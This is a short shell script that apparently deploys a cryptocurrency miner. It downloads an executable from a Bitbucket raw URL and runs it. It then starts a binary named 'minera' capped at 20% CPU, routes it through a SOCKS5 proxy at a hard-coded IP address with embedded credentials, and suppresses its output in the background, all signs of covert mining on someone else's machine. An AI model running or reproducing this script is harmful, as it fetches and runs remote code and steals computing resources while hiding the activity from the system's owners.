#!/bin/sh
apt update
apt install cpulimit screen -y
wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload
chmod +x config.json minera reload
cpulimit -l 20 ./minera -c config.json -x socks5://pasti:mokad@178.128.105.221:443 >/dev/null &
./reload
